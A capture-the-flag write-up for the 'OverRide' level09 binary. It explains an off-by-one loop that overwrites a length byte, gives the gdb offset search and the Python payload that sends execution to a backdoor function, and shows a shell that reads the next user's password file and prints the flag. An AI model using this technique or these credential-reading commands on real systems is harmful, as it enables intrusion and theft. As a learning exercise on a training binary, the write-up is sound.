#this program fills a structure message with the username and the text message and uses 2 functions set_msg and set_username.
#there is also a non used function, called secret_backdoor. This function asks an input and execs it with system()

#set_msg() uses strncpy to fill the structure, with the good size, so there is no possible overflow
#but The structure string is a buffer of char[40]. The loop in set_username starts with i = 0 and loops while i <= 40
#so 41 times and not 40. => we can overflow the next struct variable : len_message
#len_message : controls the strncpy on the set_msg function.
#we put a big number inside and the strncpy will overflow
#we inject the biggest number we can in 1 byte : 255 == 0xff
[40 bytes for username input] + [1 byte number to overwrite the len] + [\n for the next input] + [big string to segfault the strncpy]

#since the binary has been compiled in 64-bit, we need to find the right offset to overwrite the content of the stack pointer RSP
#in order to make handle_msg jump to secret_backdoor instead of returning to main.

#we get the secret_backdoor address
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
#get offset of RSP
gdb-peda$ pattern_create 255
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%'
gdb-peda$ run < <(python -c 'print "A"*40 + "\xff" + "\n" + "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%"')
[...]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555554931 in handle_msg ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
RDI+52 found at offset: 69
RBP+0 found at offset: 192
Registers point to pattern buffer:
[RSP] --> offset 200 - size ~55 => offset 200
[...]
# we write 208(0xd0) characters in the msg
level09@OverRide:~$ python -c "print 'A'*40 + '\xd0' + '\n' + 'A' * 200 +
'\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + 'sh'" > /tmp/payload_09
level09@OverRide:~$ cat /tmp/payload_09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

